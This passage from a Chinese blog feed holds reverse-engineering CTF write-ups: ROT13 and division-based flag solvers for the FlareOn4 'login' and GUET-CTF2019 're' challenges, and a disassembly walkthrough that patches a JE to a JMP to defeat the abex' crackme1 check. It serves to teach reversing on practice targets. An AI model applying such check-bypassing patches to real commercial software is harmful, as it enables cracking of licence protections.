class="number">51</span>)%<span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">96</span> <span class="keyword">and</span> i &lt;= <span class="number">122</span>:</span><br><span class="line">            i = (i-<span class="number">79</span>)%<span class="number">26</span> + <span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span>(i == x[k]):</span><br><span class="line">            flag += <span class="built_in">chr</span>(z)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h1 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="[FlareOn4]login"></a>[FlareOn4]login</h1><p>这是个前端验证flag的题目</p><p>题目给了一个提示</p><p><img src="/2021/07/18/BUU-reverse/login1.PNG" alt="login1"></p><p>直接查看源码</p><p><img src="/2021/07/18/BUU-reverse/login2.PNG" alt="login2"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">String</span>.fromCharCode((c &lt;= <span class="string">&quot;Z&quot;</span> ? <span class="number">90</span> : <span class="number">122</span>) &gt;= (c = c.charCodeAt(<span class="number">0</span>) + <span class="number">13</span>) ? c : c - <span class="number">26</span>);</span><br></pre></td></tr></table></figure><p>关键的函数就是这一句，先判断大小写，与对应的Z或者z比较，大于减26，小于就原来的加上13的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">&#x27;PyvragFvqrYbtvafNerRnfl@syner-ba.pbz&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">65</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">90</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i) - <span class="number">13</span> &lt; <span class="number">65</span> :</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) - <span class="number">13</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">ord</span>(i) &gt;= <span class="number">97</span> <span class="keyword">and</span> <span class="built_in">ord</span>(i) &lt;= <span class="number">122</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(i) - <span class="number">13</span> &lt; <span class="number">97</span> :</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) + <span class="number">13</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(i) - <span class="number">13</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += i</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后的结果<a href="mailto:&#67;&#x6c;&#x69;&#x65;&#x6e;&#x74;&#83;&#x69;&#x64;&#101;&#76;&#x6f;&#103;&#x69;&#x6e;&#115;&#x41;&#x72;&#x65;&#69;&#97;&#115;&#x79;&#x40;&#102;&#x6c;&#97;&#114;&#101;&#x2d;&#111;&#x6e;&#46;&#x63;&#111;&#109;">&#67;&#x6c;&#x69;&#x65;&#x6e;&#x74;&#83;&#x69;&#x64;&#101;&#76;&#x6f;&#103;&#x69;&#x6e;&#115;&#x41;&#x72;&#x65;&#69;&#97;&#115;&#x79;&#x40;&#102;&#x6c;&#97;&#114;&#101;&#x2d;&#111;&#x6e;&#46;&#x63;&#111;&#109;</a>，与文件中的提示相对应</p><h1 id="GUET-CTF2019-re"><a href="#GUET-CTF2019-re" class="headerlink" title="[GUET-CTF2019]re"></a>[GUET-CTF2019]re</h1><p>查壳，发现有一个UPX壳</p><p><img src="/2021/07/18/BUU-reverse/re1.PNG" alt="re1"></p><p><img src="/2021/07/18/BUU-reverse/re2.PNG" alt="re2"></p><p><strong>代码分析</strong></p><p><img src="/2021/07/18/BUU-reverse/re3.PNG" alt="re3"></p><p>打开关键函数sub_4009AE</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_4009AE</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">1629056</span> * *a1 != <span class="number">166163712</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6771600</span> * a1[<span class="number">1</span>] != <span class="number">731332800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3682944</span> * a1[<span class="number">2</span>] != <span class="number">357245568</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10431000</span> * a1[<span class="number">3</span>] != <span class="number">1074393000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3977328</span> * a1[<span class="number">4</span>] != <span class="number">489211344</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5138336</span> * a1[<span class="number">5</span>] != <span class="number">518971936</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7532250</span> * a1[<span class="number">7</span>] != <span class="number">406741500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5551632</span> * a1[<span class="number">8</span>] != <span class="number">294236496</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3409728</span> * a1[<span class="number">9</span>] != <span class="number">177305856</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13013670</span> * a1[<span class="number">10</span>] != <span class="number">650683500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6088797</span> * a1[<span class="number">11</span>] != <span class="number">298351053</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7884663</span> * a1[<span class="number">12</span>] != <span class="number">386348487</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8944053</span> * a1[<span class="number">13</span>] != <span class="number">438258597</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5198490</span> * a1[<span class="number">14</span>] != <span class="number">249527520</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4544518</span> * a1[<span class="number">15</span>] != <span class="number">445362764</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">3645600</span> * a1[<span class="number">17</span>] != <span class="number">174988800</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">10115280</span> * a1[<span class="number">16</span>] != <span class="number">981182160</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9667504</span> * a1[<span class="number">18</span>] != <span class="number">493042704</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5364450</span> * a1[<span class="number">19</span>] != <span class="number">257493600</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">13464540</span> * a1[<span class="number">20</span>] != <span class="number">767478780</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">5488432</span> * a1[<span class="number">21</span>] != <span class="number">312840624</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">14479500</span> * a1[<span class="number">22</span>] != <span class="number">1404511500</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6451830</span> * a1[<span class="number">23</span>] != <span class="number">316139670</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">6252576</span> * a1[<span class="number">24</span>] != <span class="number">619005024</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7763364</span> * a1[<span class="number">25</span>] != <span class="number">372641472</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">7327320</span> * a1[<span class="number">26</span>] != <span class="number">373693320</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8741520</span> * a1[<span class="number">27</span>] != <span class="number">498266640</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">8871876</span> * a1[<span class="number">28</span>] != <span class="number">452465676</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">4086720</span> * a1[<span class="number">29</span>] != <span class="number">208422720</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="number">9374400</span> * a1[<span class="number">30</span>] == <span class="number">515592000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">5759124</span> * a1[<span class="number">31</span>] == <span class="number">719890500</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>a1就是我们输入的v4，反向除就行,但是这里少了一个a7，需要去猜1-f</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">a1 = <span class="built_in">chr</span>(<span class="number">166163712</span> // <span class="number">1629056</span>)</span><br><span class="line">a2 = <span class="built_in">chr</span>(<span class="number">731332800</span> // <span class="number">6771600</span>)</span><br><span class="line">a3 = <span class="built_in">chr</span>(<span class="number">357245568</span> // <span class="number">3682944</span>)</span><br><span class="line">a4 = <span class="built_in">chr</span>(<span class="number">1074393000</span> // <span class="number">10431000</span>)</span><br><span class="line">a5 = <span class="built_in">chr</span>(<span class="number">489211344</span> // <span class="number">3977328</span>)</span><br><span class="line">a6 = <span class="built_in">chr</span>(<span class="number">518971936</span> // <span class="number">5138336</span>)</span><br><span class="line">a8 = <span class="built_in">chr</span>(<span class="number">406741500</span> // <span class="number">7532250</span>)</span><br><span class="line">a9 = <span class="built_in">chr</span>(<span class="number">294236496</span> // <span class="number">5551632</span>)</span><br><span class="line">a10 = <span class="built_in">chr</span>(<span class="number">177305856</span> // <span class="number">3409728</span>)</span><br><span class="line">a11 = <span class="built_in">chr</span>(<span class="number">650683500</span> // <span class="number">13013670</span>)</span><br><span class="line">a12 = <span class="built_in">chr</span>(<span class="number">298351053</span> // <span class="number">6088797</span>)</span><br><span class="line">a13 = <span class="built_in">chr</span>(<span class="number">386348487</span> // <span class="number">7884663</span>)</span><br><span class="line">a14 = <span class="built_in">chr</span>(<span class="number">438258597</span> // <span class="number">8944053</span>)</span><br><span class="line">a15 = <span class="built_in">chr</span>(<span class="number">249527520</span> // <span class="number">5198490</span>)</span><br><span class="line">a16 = <span class="built_in">chr</span>(<span class="number">445362764</span> // <span class="number">4544518</span>)</span><br><span class="line">a17 = <span class="built_in">chr</span>(<span class="number">981182160</span> // <span class="number">10115280</span>)</span><br><span class="line">a18 = <span class="built_in">chr</span>(<span class="number">174988800</span> // <span class="number">3645600</span>)</span><br><span class="line">a19 = <span class="built_in">chr</span>(<span class="number">493042704</span> // <span class="number">9667504</span>)</span><br><span class="line">a20 = <span class="built_in">chr</span>(<span class="number">257493600</span> // <span class="number">5364450</span>)</span><br><span class="line">a21 = <span class="built_in">chr</span>(<span class="number">767478780</span> // <span class="number">13464540</span>)</span><br><span class="line">a22 = <span class="built_in">chr</span>(<span class="number">312840624</span> // <span class="number">5488432</span>)</span><br><span class="line">a23 = <span class="built_in">chr</span>(<span class="number">1404511500</span> // <span class="number">14479500</span>)</span><br><span class="line">a24 = <span class="built_in">chr</span>(<span class="number">316139670</span> // <span class="number">6451830</span>)</span><br><span class="line">a25 = <span class="built_in">chr</span>(<span class="number">619005024</span> // <span class="number">6252576</span>)</span><br><span class="line">a26 = <span class="built_in">chr</span>(<span class="number">372641472</span> // <span class="number">7763364</span>)</span><br><span class="line">a27 = <span class="built_in">chr</span>(<span class="number">373693320</span> // <span class="number">7327320</span>)</span><br><span class="line">a28 = <span class="built_in">chr</span>(<span class="number">498266640</span> // <span class="number">8741520</span>)</span><br><span class="line">a29 = <span class="built_in">chr</span>(<span class="number">452465676</span> // <span class="number">8871876</span>)</span><br><span class="line">a30 = <span class="built_in">chr</span>(<span class="number">208422720</span> // <span class="number">4086720</span>)</span><br><span class="line">a31 = <span class="built_in">chr</span>(<span class="number">515592000</span> // <span class="number">9374400</span>)</span><br><span class="line">a32 = <span class="built_in">chr</span>(<span class="number">719890500</span> // <span class="number">5759124</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (a1,a2,a3,a4,a5,a6,a8,a9,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a30,a31,a32)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;【2019红帽杯】easyRE&quot;&gt;&lt;a href=&quot;#【2019红帽杯】easyRE&quot; class=&quot;headerlink&quot; title=&quot;【2019红帽杯】easyRE&quot;&gt;&lt;/a&gt;【2019红帽杯】easyRE&lt;/h1&gt;&lt;p&gt;直接IDA打开，搜索字符串找到一个y</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>分析abex&#39;crackme1</title>
    <link href="http://example.com/2021/07/16/%E5%88%86%E6%9E%90crackme1/"/>
    <id>http://example.com/2021/07/16/%E5%88%86%E6%9E%90crackme1/</id>
    <published>2021-07-16T08:30:41.000Z</published>
    <updated>2021-07-19T07:55:11.024Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-abex’crackme1"><a href="#一-abex’crackme1" class="headerlink" title="一.abex’crackme1"></a>一.abex’crackme1</h1><p>调试前先运行abex’crackme #1这个程序，大致了解一下它。双击运行程序后弹出一个消息窗口,显示“Make me think your HD is a CD-Rom”消息。不太理解这句英文。消息的最后部分出现了“CD-Rom”这个词，我们只能根据它大致推测出前面的HD为HDD(Hard Disk Drive)的意思。由于没有更多选择，我们继续按消息窗口中的“确定”按钮。</p><p><img src="/2021/07/16/%E5%88%86%E6%9E%90crackme1/1.PNG" alt="1"></p><p>程序弹出Error消息窗后就终止运行了。但是abex到底想要干什么（要怎样破解什么）仍然不得而知。下面直接调试分析它，把握这个小程序的意图。</p><p><img src="/2021/07/16/%E5%88%86%E6%9E%90crackme1/2.PNG" alt="2"></p><h1 id="二-开始调试"><a href="#二-开始调试" class="headerlink" title="二.开始调试"></a>二.开始调试</h1><p><img src="/2021/07/16/%E5%88%86%E6%9E%90crackme1/3.PNG" alt="3"></p><p>由于代码非常简短,我们一点点地分析,重点看右上部分关于Win32 API调用的内容。如果之前大家从事过Windows应用程序的开发，那么对以上几个函数的含义应该非常了解。从上述代码的分析中，我们能够准确把握程序制作者的真正意图。在消息窗口按“确定”后，程序会调用GetDriveType() API，获取C驱动器的类型(大部分返回的是HDD类型)，然后操作它，使之被识别为CD-ROM类型,再在消息窗口中输出“OK, I really think that your HD is a CD-ROM!:p”消息。下面逐行分析crackme的代码。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;调用NessageBoxA()函数00401000 PUSH 0</span></span><br><span class="line"><span class="number">00404000</span> PUSH <span class="number">0</span>                 <span class="comment">;Style =MB_OKIMB_APPLMODAL</span></span><br><span class="line"><span class="number">00401002</span> PUSH <span class="number">402000</span>            <span class="comment">;Title = &quot;abex1st crackme”</span></span><br><span class="line"><span class="number">00401007</span> PUSH <span class="number">402012</span>            <span class="comment">;Text =“Make me think your HD is a CD-Rom.”</span></span><br><span class="line"><span class="number">0040100</span>c PUSH <span class="number">0</span>                 <span class="comment">; hOwner - NULL</span></span><br><span class="line"><span class="number">0040100</span>E CALL <span class="number">00401061</span>          <span class="comment">; MessageBoxA</span></span><br><span class="line">:在函数肉部ESI被设置为FFFFFFFF</span><br><span class="line"><span class="comment">;调用GetDriveType()函数</span></span><br><span class="line"><span class="number">00401013</span> PUSH <span class="number">402094</span><span class="comment">;RootPathName = &quot;c: 1”</span></span><br><span class="line"><span class="number">00401018</span> CALL <span class="number">00401055</span><span class="comment">; GetDriveTypeA</span></span><br><span class="line"><span class="comment">;返回值(EAX)是3(DRIVE_FIXED)</span></span><br><span class="line"><span class="number">0040101</span>D INC ESI<span class="comment">; ESI =0</span></span><br><span class="line"><span class="number">0040101</span>E DEC EAX<span class="comment">;EAX =2</span></span><br><span class="line"><span class="number">0040101</span>F <span class="keyword">JMP </span><span class="keyword">SHORT </span><span class="number">00401021</span></span><br><span class="line"><span class="number">00401021</span> INC ESI<span class="comment">;ESI = 1</span></span><br><span class="line"><span class="number">00401022</span> INC ESI<span class="comment">;ESI =2</span></span><br><span class="line"><span class="number">00401023</span> DEC EAX<span class="comment">;EAX=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;条件分支(401028或40103D)</span></span><br><span class="line"><span class="number">00401024</span> CMP EAX,ESI<span class="comment">;比较EAX(1)与EAX(2)</span></span><br><span class="line"><span class="number">00401026</span> <span class="keyword">JE </span><span class="keyword">SHORT </span><span class="number">0040103</span>D<span class="comment">;JE (Jump if Equal)条件分支命令;若两值相等,则跳转到40103D,</span></span><br><span class="line"><span class="comment">;若两值不等,则从401028继续执行;在40103D地址为消息框输出代码</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;MessageBo×A()函数调用失败</span></span><br><span class="line"><span class="number">00401028</span> PUSH <span class="number">0</span><span class="comment">; Style = MB_OK|MB_APPLMODAL</span></span><br><span class="line"><span class="number">0040102</span>A PUSH <span class="number">402035</span><span class="comment">;Title = &quot;Error”</span></span><br><span class="line"><span class="number">0040102</span>F PUSH <span class="number">40203</span>B:Text -<span class="string">&quot;Nah. . . This is not a CD-ROM Drive!&quot;</span></span><br><span class="line"><span class="number">00401034</span> PUSH <span class="number">0</span><span class="comment">;hOwner - NULL</span></span><br><span class="line"><span class="number">00401036</span> CALL <span class="number">00401061</span><span class="comment">; MessageBoxA</span></span><br><span class="line"><span class="number">0040103</span>B <span class="keyword">JMP </span> <span class="keyword">SHORT </span><span class="number">00401050</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;MessageBoxA(函数调用成功</span></span><br><span class="line"><span class="number">0040103</span>D PUSH <span class="number">0</span><span class="comment">;Style=MB_OKIMB_APPLMODAL</span></span><br><span class="line"><span class="number">0040103</span>F PUSH <span class="number">40205</span>E<span class="comment">; Title = &quot;YEAH!&quot;</span></span><br><span class="line"><span class="number">00401044</span> PUSH <span class="number">402064</span><span class="comment">;Text -&quot;Ok,Ireally think that your HDis a CD-ROM! :p”</span></span><br><span class="line"><span class="number">00401049</span> PUSH <span class="number">0</span><span class="comment">;hOwner = NULL</span></span><br><span class="line"><span class="number">0040104</span>B CALL <span class="number">00401061</span><span class="comment">;MessageBoxA</span></span><br><span class="line"></span><br><span class="line"><span class="comment">;终止进程</span></span><br><span class="line"><span class="number">00401050</span> CALL <span class="number">0040105</span>B<span class="comment">;ExitProcess</span></span><br></pre></td></tr></table></figure><p>可以看到就是通过比较AX和SI的值，等于就跳转，只需要把JE修改为无条件跳转指令JMP就可以了</p><p><img src="/2021/07/16/%E5%88%86%E6%9E%90crackme1/4.PNG" alt="4"></p><p>得到最后的结果。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-abex’crackme1&quot;&gt;&lt;a href=&quot;#一-abex’crackme1&quot; class=&quot;headerlink&quot; title=&quot;一.abex’crackme1&quot;&gt;&lt;/a&gt;一.abex’crackme1&lt;/h1&gt;&lt;p&gt;调试前先运行abex’crackme</summary>
      
    
    
    
    
  </entry>
  
</feed>
